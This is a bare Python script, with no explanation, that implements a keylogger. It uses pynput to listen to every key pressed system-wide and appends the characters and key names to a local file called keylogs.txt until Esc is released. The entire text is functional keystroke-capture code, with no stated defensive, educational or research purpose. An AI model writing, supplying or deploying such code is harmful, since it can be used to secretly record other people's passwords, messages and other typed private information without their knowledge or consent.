import os
from pynput import keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            elif key == keyboard.Key.space:
                f.write(' ')
            else:
                f.write(f'[{key}]')
    except Exception as e:
        print(f"Error logging keystroke: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()